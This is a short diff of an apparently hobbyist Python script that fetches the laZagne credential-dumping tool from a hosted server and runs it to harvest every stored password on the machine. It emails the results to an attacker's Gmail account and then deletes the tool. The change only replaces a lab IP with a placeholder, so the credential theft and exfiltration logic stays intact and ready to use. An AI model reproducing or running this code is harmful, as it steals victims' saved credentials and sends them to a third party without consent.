@@ -18,7 +18,7 @@ def sendmail(email, password, message):
     server.quit()
 
 #make sure  you are hosting a local server with laZagne.exe
-download("http://10.0.2.10/malware/lazagne.exe")
+download("THE HTTP SERVER WHERE YOU HOST THE FILE lazagne.exe")
 result = subprocess.check_output("laZagne.exe all", shell=True)
 sendmail("YOUR GMAIL HERE", "PASSWORD HERE", result)
 os.remove("laZagne.exe")
